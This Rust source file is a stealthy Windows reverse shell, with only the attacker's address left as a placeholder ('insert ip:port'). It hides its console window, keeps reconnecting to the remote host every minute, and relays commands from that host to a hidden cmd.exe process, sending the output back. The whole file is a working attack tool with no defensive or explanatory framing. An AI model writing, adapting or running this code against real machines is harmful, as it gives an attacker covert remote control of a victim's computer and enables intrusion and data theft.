#![windows_subsystem = "windows"]

use std::io::{Read, Write};
use std::net::{Shutdown, TcpStream};
use std::{thread, time};
use std::os::windows::process::CommandExt;
use std::process::{Command, Stdio};

fn main() {
    loop {
        if let Ok(mut sock) = TcpStream::connect("insert ip:port") {
            sh(&mut sock);
        }
        else {
            thread::sleep(time::Duration::from_secs(60));
        }
    }
}

fn sh(sock : &mut TcpStream) {
    let mut buf = [0; 1000];
    let mut p_buf = Vec::new();
    const CREATE_NO_WINDOW: u32 = 0x08000000;

    loop {

        let process = Command::new("cmd")
            .creation_flags(CREATE_NO_WINDOW)
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn().unwrap();

        if let Err(_e) = sock.read(&mut buf){
            break;
        }

        if let Err(e) = process.stdin.unwrap().write_all(&buf){
            panic!("couldn't write to shell stdin: {}", e.to_string())
        }

        match process.stdout.unwrap().read_to_end(&mut p_buf) {
            Err(e) => panic!("couldn't read shell stdout: {}", e.to_string()),
            Ok(_) => sock.write_all(&p_buf).unwrap_or_else(|_e|{
                sock.shutdown(Shutdown::Both).expect("Failed to shutdown");
            }),
        };
    }
}